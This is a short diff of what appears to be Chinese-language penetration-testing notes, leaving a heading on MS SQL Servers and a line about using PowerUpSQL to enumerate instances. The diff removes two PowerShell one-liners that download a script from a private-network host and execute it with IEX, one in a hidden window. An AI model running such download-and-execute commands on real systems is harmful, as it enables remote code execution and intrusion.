@@ -1,5 +1,3 @@
-powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"
-powershell.exe  -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"
 # MS SQL Servers
 
 引入powerupsql，枚举mssql实例
